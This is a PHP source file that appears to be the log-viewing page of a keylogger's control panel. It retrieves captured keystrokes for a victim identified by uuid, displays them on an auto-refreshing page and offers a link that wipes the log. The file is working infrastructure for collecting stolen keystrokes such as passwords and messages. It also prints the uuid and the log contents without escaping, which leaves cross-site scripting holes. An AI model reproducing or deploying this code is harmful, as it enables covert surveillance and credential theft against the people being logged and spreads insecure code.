<?php
session_start();
if(empty($_SESSION['auth'])) {
	header('Location: login.php');
	die();
}

include '../sys/head.php';

if(!empty($_GET['clear'])) {
  header("location: logview.php?uuid={$_GET['clear']}");
  $db->table('keylogs')->find('uuid', $_GET['clear'])->change('log', '[Keylog]> ');
	die();
}
if(empty($_GET['uuid'])) {
  die();
}
?>
<title>Keylog Viewer</title>
<meta http-equiv="refresh" content="5"/>
<style>
h2.logsViewPort {
    display: inline;
}
a {
  text-decoration: none;
  color: red;
}
</style>
<?php
$uuid = $_GET['uuid'];
if($logs = $db->table('keylogs')->find('uuid', $uuid, 1)->get()) {
  $log = $logs[array_key_first($logs)]['log'];
  $log = str_replace('{ENTR}', "{ENTR}\n", $log);
  echo "<h2 class='logsViewPort'>Keylogs: </h2>{$uuid} - <b>";
  echo "<a href='logview.php?clear={$uuid}'>Clear Logs</a></b><br />";
  echo "<hr />";
  echo "<textarea id='keylogs' style='width:100%;height:93%;resize: none;' disabled>{$log}</textarea>";
} else {
  echo "<h2 class='logsViewPort'>Keylogs: </h2>{$uuid} - <b>";
  echo "<a href='logview.php?clear={$uuid}'>Clear Logs</a></b><br />";
  echo "<hr />";
  echo "<textarea id='keylogs' style='width:100%;height:93%;resize: none;' disabled>[Keylog]></textarea>";
}
?>
<script src="../vendor/jquery/jquery.min.js"></script>
